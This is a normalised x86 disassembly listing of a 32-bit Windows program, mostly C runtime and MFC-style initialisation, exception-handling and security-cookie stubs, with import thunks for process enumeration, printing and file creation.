mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4141f3
push 0xa
call sub_414124
pop ecx
retn
sub_414d2c
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_415558
push 0x0
call sub_4154f5
pop ecx
retn
sub_4155c4
call [ TlsAlloc@IAT ]
retn 0x4
sub_4155cd
push [ rw-data ]
call [ TlsGetValue@IAT ]
test eax eax
jne r-xdata
retn
push [ rw-data ]
call sub_415561
pop ecx
push eax
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_4156df
push 0xc
call sub_414124
pop ecx
retn
sub_41588f
push 0xd
call sub_414124
pop ecx
retn
sub_41589b
push 0xc
call sub_414124
pop ecx
retn
sub_415a8f
push 0xe
call sub_414124
pop ecx
retn
sub_41637e
xor eax eax
inc eax
retn
sub_4164dd
push sub_416471
call [ SetUnhandledExceptionFilter@IAT ]
push eax
call sub_4154f5
mov [ rw-data ] eax
pop ecx
mov [ rw-data ] 0x1
xor eax eax
retn
sub_4164fe
cmp [ rw-data ] 0x0
je r-xdata
retn
push [ rw-data ]
call sub_415561
pop ecx
push eax
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] 0x0
sub_416522
mov [ ecx ] r--data
jmp sub_41be1c
sub_41652d
push esi
mov esi ecx
mov [ esi ] r--data
call sub_41be1c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_416671
push [ ebp - 0x14 ]
call sub_4165ab
pop ecx
retn
sub_4166b5
call sub_41576b
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_41576b
add eax 0x90
dec [ eax ]
sub_416758
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_416761
mov esp [ ebp - 0x18 ]
jmp sub_4171ac
sub_416807
push 0x4
mov eax sub_421198
call sub_410250
call sub_41576b
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4171e5
call sub_4171f8
sub_4168e0
mov eax [ ebp - 0x14 ]
call sub_4166d0
retn
sub_416b57
xor eax eax
inc eax
retn
sub_416b5b
mov esp [ ebp - 0x18 ]
jmp sub_4171ac
sub_416bf0
xor eax eax
inc eax
retn
sub_416bf4
mov esp [ ebp - 0x18 ]
jmp sub_4171ac
sub_4170b0
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_41bdc4
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4171ac
push 0x8
push r--data
call sub_4106dc
call sub_41576b
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_41a831
and [ ebp - 0x4 ] 0x0
call eax
jmp sub_4171d3
sub_4171d3
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a831
sub_4171e5
call sub_41576b
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_4171ac
call eax
sub_41721c
xor eax eax
inc eax
retn
sub_41722f
push sub_4171ac
call sub_4154f5
pop ecx
mov [ rw-data ] eax
retn
sub_41800d
int3
sub_4180e6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_418010
add esp 0xc
pop ebp
retn 0x4
sub_41814c
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_418010
add esp 0xc
pop ebp
retn 0x8
sub_418228
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
xor ecx ecx
cmp eax 0xc0000005
sete cl
mov eax ecx
retn
sub_41869b
and [ rw-data ] 0x0
call sub_41bfe3
mov [ rw-data ] eax
xor eax eax
retn
sub_418987
mov eax rw-data
retn
sub_41898d
mov eax rw-data
retn
sub_418999
mov eax rw-data
retn
sub_418c4e
push 0x7
call sub_414124
pop ecx
retn
sub_4190c7
push 0x6
call sub_414124
pop ecx
retn
sub_419108
push 0x6
call sub_414124
pop ecx
retn
sub_41947b
push 0xd
call sub_414124
pop ecx
retn
sub_41980a
push 0xd
call sub_414124
pop ecx
retn
sub_419843
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4196a9
pop ecx
mov [ rw-data ] 0x1
sub_419b5b
push 0xc
call sub_414124
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_419dc7
fldz
mov eax [ esp + 0x4 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
sub_419e1d
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_419ddd
add esp 0x10
retn
sub_419e51
push 0x0
push [ esp + 0x8 ]
call sub_419cd6
pop ecx
pop ecx
retn
sub_419e5f
push 0x0
push [ esp + 0x8 ]
call sub_419d47
pop ecx
pop ecx
retn
sub_41a0a8
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419fda
add esp 0x18
pop ebp
retn
sub_41a924
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_41a92e
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_41a97b
push [ rw-data ]
call sub_415561
pop ecx
retn
sub_41aafc
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_414124
pop ecx
sub_41ab38
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_41ab42
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_41ab4c
push [ esp + 0x4 ]
call [ InitializeCriticalSection@IAT ]
xor eax eax
inc eax
retn 0x8
sub_41abe2
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_41abf9
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x24 ] 0xc0000017
jne r-xdata
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_410721
retn
push 0x8
call [ SetLastError@IAT ]
sub_41ac5d
and [ rw-data ] 0x0
retn
sub_41adf7
push [ ebp + 0x8 ]
call sub_41d2d4
pop ecx
retn
sub_41b499
push [ ebp + 0x8 ]
call sub_41d2d4
pop ecx
retn
sub_41b545
mov eax rw-data
retn
sub_41b5fc
call sub_41d5d5
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_40f613
pop ecx
retn
call sub_41d3b8
sub_41b6ed
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_41b862
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_41b703
add esp 0x14
retn
sub_41b8b3
push 0x0
push [ esp + 0x8 ]
call sub_41b87d
pop ecx
pop ecx
retn
sub_41bd69
xor eax eax
inc eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
retn
xor eax eax
sub_41be1c
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_40f613
pop ecx
sub_41be32
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_41be3f
push esi
mov esi ecx
call sub_41be1c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_41bf45
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_41be7c
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_41bf90
call eax
retn
sub_41bf93
push 0xc
push r--data
call sub_4106dc
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_410721
retn
sub_41bfb0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_41c043
call sub_41bfe3
mov [ rw-data ] eax
xor eax eax
retn
sub_41c0d1
call sub_41576b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_419af1
sub_41c20a
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_41c0f7
add esp 0x10
retn
sub_41d0cf
push 0x2
call sub_412f6d
pop ecx
retn
sub_41d2cb
push 0xa
call sub_414124
pop ecx
retn
sub_41d2d4
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_41d44e
push 0x1
call sub_414124
pop ecx
retn
sub_41d59d
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_41b69d
pop ecx
pop ecx
retn
sub_41d5cc
push 0x1
call sub_414124
pop ecx
retn
sub_41d5d5
push 0x1
call sub_41d4fb
pop ecx
retn
sub_41d6ca
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_41d5de
add esp 0x10
retn
sub_41f8a0
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_41f9d3
push esi
call sub_41b66e
pop ecx
retn
sub_41fab2
push [ ebp + 0x8 ]
call sub_41d2d4
pop ecx
retn
sub_4204ca
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_420666
push [ ebp + 0x8 ]
call sub_41d2d4
pop ecx
retn
Process32First
jmp [ Process32First@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
DocumentPropertiesA
jmp [ DocumentPropertiesA@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_42072b
push 0x3
pop eax
retn
sub_420793
push esi
push 0x18
mov esi ecx
push 0x0
push esi
call sub_4109d0
add esp 0xc
mov eax esi
pop esi
retn
sub_4207a7
push 0xc
push r--data
call sub_4106dc
and [ ebp - 0x4 ] 0x0
push ecx
call [ InitializeCriticalSection@IAT ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_410721
retn
sub_4207c4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_4207f2
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] 0x2c
jne r-xdata
mov eax 0x80070057
jmp r-xdata
and [ eax + 0x1c ] 0x0
lea ecx [ eax + 0x4 ]
call sub_4207a7
retn 0x4
sub_420859
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
call sub_420793
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov eax esi
pop esi
retn
sub_4208d3
push esi
mov esi ecx
lea ecx [ esi + 0x18 ]
call sub_420793
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] eax
mov eax esi
pop esi
retn
sub_4208ed
push esi
mov esi ecx
lea eax [ esi + 0x18 ]
push eax
call [ DeleteCriticalSection@IAT ]
lea ecx [ esi + 0x30 ]
pop esi
jmp sub_420815
sub_4209d8
push esi
push [ rw-data ]
mov esi ecx
push esi
call sub_420873
lea ecx [ esi + 0x20 ]
pop esi
jmp sub_420815
sub_4209f0
mov eax CreateStdAccessibleObject@IAT
jmp sub_4209fa
sub_4209fa
push ecx
push edx
push eax
push __delay_import_directory_entries
call sub_420a21
pop edx
pop ecx
jmp eax
CreateStdAccessibleObject
jmp [ CreateStdAccessibleObject@IAT ]
sub_420a11
mov eax LresultFromObject@IAT
jmp sub_4209fa
LresultFromObject
jmp [ LresultFromObject@IAT ]
sub_420c60
push [ ebp - 0x10 ]
call sub_4072fc
retn
sub_420c69
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420c84
mov ecx [ ebp - 0x18 ]
add ecx 0xc
jmp sub_405c5d
sub_420c8f
lea ecx [ ebp - 0x14 ]
jmp sub_405c5d
sub_420c97
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_40f589
mov ecx [ edx + 0x20c ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420cbf
lea ecx [ ebp - 0x10 ]
jmp sub_405c5d
sub_420cc7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_40f589
mov ecx [ edx + 0x14c ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420cef
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_405c5d
sub_420cfa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420d15
mov ecx [ ebp - 0x10 ]
jmp sub_405c5d
sub_420d1d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420d38
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_405c5d
sub_420d51
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40f589
mov ecx [ edx + 0x134 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420d79
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420d94
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420daf
push rw-data
push [ ebp - 0x10 ]
call sub_40a33b
pop ecx
pop ecx
retn
sub_420dbf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420dda
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_405c5d
sub_420de5
mov ecx [ ebp - 0x10 ]
add ecx 0x74
jmp j_sub_407786
sub_420df0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420e0b
lea ecx [ ebp - 0x10 ]
jmp sub_405c5d
sub_420e13
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420e2e
mov ecx [ ebp - 0x14 ]
add ecx 0x34
jmp sub_405c5d
sub_420e39
mov ecx [ ebp - 0x14 ]
add ecx 0x74
jmp j_sub_407786
sub_420e44
push [ ebp + 0x8 ]
call sub_4072fc
retn
sub_420e4d
push [ ebp + 0x8 ]
call sub_4072fc
retn
sub_420e56
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420e71
lea ecx [ ebp - 0x10 ]
jmp sub_405c5d
sub_420e79
lea ecx [ ebp + 0x10 ]
jmp sub_405c5d
sub_420e81
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420e9c
push [ ebp - 0x14 ]
call sub_405551
retn
sub_420ea5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420ec0
lea ecx [ ebp - 0x14 ]
jmp sub_405c5d
sub_420ec8
lea ecx [ ebp + 0x10 ]
jmp sub_405c5d
sub_420ed0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420eeb
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_405c5d
sub_420ef6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420f11
lea ecx [ ebp - 0x14 ]
jmp sub_4084f4
sub_420f19
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420f34
push [ ebp - 0x10 ]
call sub_405551
retn
sub_420f3d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420f58
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
call sub_40946d
retn
sub_420f64
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420f7f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420f9a
mov ecx [ ebp - 0x10 ]
jmp sub_40ea01
sub_420fa2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420fbd
lea ecx [ ebp - 0x60 ]
jmp sub_40c34d
sub_420fc5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420fe0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_420ffb
lea ecx [ ebp - 0x18 ]
jmp sub_4084f4
sub_421003
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x158 ]
xor ecx eax
call sub_40f589
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_42102b
lea ecx [ ebp - 0x14 ]
jmp j_sub_40aafe
sub_421033
lea ecx [ ebp - 0x28 ]
jmp sub_409891
sub_42103b
lea ecx [ ebp - 0x7c ]
jmp sub_40c34d
sub_421043
lea ecx [ ebp - 0x28 ]
jmp sub_409891
sub_42104b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_421066
push [ ebp - 0x1c ]
call j_sub_40f613
pop ecx
retn
sub_421070
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_42108b
lea ecx [ ebp - 0x14 ]
jmp sub_405c5d
sub_421093
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40f589
mov ecx [ edx + 0x20c ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_4210bb
lea ecx [ ebp + 0xb ]
jmp sub_40debd
sub_4210c3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_4210de
lea ecx [ ebp + 0xc ]
jmp sub_40b75a
sub_4210e6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_421101
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_42111c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_421137
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp j_sub_40f52f
sub_421142
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_4089d8
sub_42114d
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_4089d8
sub_421158
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_421173
push [ ebp + 0x8 ]
call j_sub_40f613
pop ecx
retn
sub_42117d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_421198
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_4211c0
lea ecx [ ebp - 0x138 ]
jmp sub_405f18
sub_4211cb
lea ecx [ ebp - 0x128 ]
jmp sub_405f18
sub_4211d6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x134 ]
mov ecx [ edx - 0x138 ]
xor ecx eax
call sub_40f589
add eax 0x4
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f589
mov eax r--data
jmp sub_40fedf
sub_421204
push sub_4214df
call sub_410412
pop ecx
retn
sub_421210
push sub_4214ea
call sub_410412
pop ecx
retn
sub_42121c
push sub_4214f5
call sub_410412
pop ecx
retn
sub_421228
push sub_421500
call sub_410412
pop ecx
retn
sub_421234
push sub_42150a
call sub_410412
pop ecx
retn
sub_421240
mov ecx rw-data
jmp sub_40835f
sub_42124a
mov ecx rw-data
call sub_408686
push sub_421514
call sub_410412
pop ecx
retn
sub_421260
push 0x0
mov ecx rw-data
call sub_405568
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push sub_42151f
mov [ rw-data ] r--data
mov [ rw-data ] 0xf022
call sub_410412
pop ecx
retn
sub_42129a
push 0x0
mov ecx rw-data
call sub_405568
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push sub_42152a
mov [ rw-data ] r--data
mov [ rw-data ] 0xf024
call sub_410412
pop ecx
retn
sub_4212d4
push sub_421535
call sub_410412
pop ecx
retn
sub_4212e0
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
retn
sub_42149d
push rw-data
call sub_406ef3
retn
sub_4214a8
call sub_40f4ce
mov [ rw-data ] eax
retn
sub_4214b3
mov ecx rw-data
call sub_420929
push sub_421567
call sub_410412
pop ecx
retn
sub_4214c9
mov ecx rw-data
call sub_420903
push sub_421571
call sub_410412
pop ecx
retn
sub_4214df
mov [ rw-data ] r--data
retn
sub_4214ea
mov [ rw-data ] r--data
retn
sub_4214f5
mov [ rw-data ] r--data
retn
sub_421500
mov ecx rw-data
jmp sub_407786
sub_42150a
mov ecx rw-data
jmp sub_4073a9
sub_421514
push rw-data
call sub_40e5fe
retn
sub_42151f
mov [ rw-data ] r--data
retn
sub_42152a
mov [ rw-data ] r--data
retn
sub_421535
mov ecx rw-data
jmp sub_4073a9
sub_42153f
mov ecx rw-data
jmp sub_40c34d
sub_421549
mov ecx rw-data
jmp sub_40c34d
sub_421553
mov ecx rw-data
jmp sub_40c34d
sub_42155d
mov ecx rw-data
jmp sub_40c34d
sub_421567
mov ecx rw-data
jmp sub_4208ed
sub_421571
mov ecx rw-data
jmp sub_4209d8
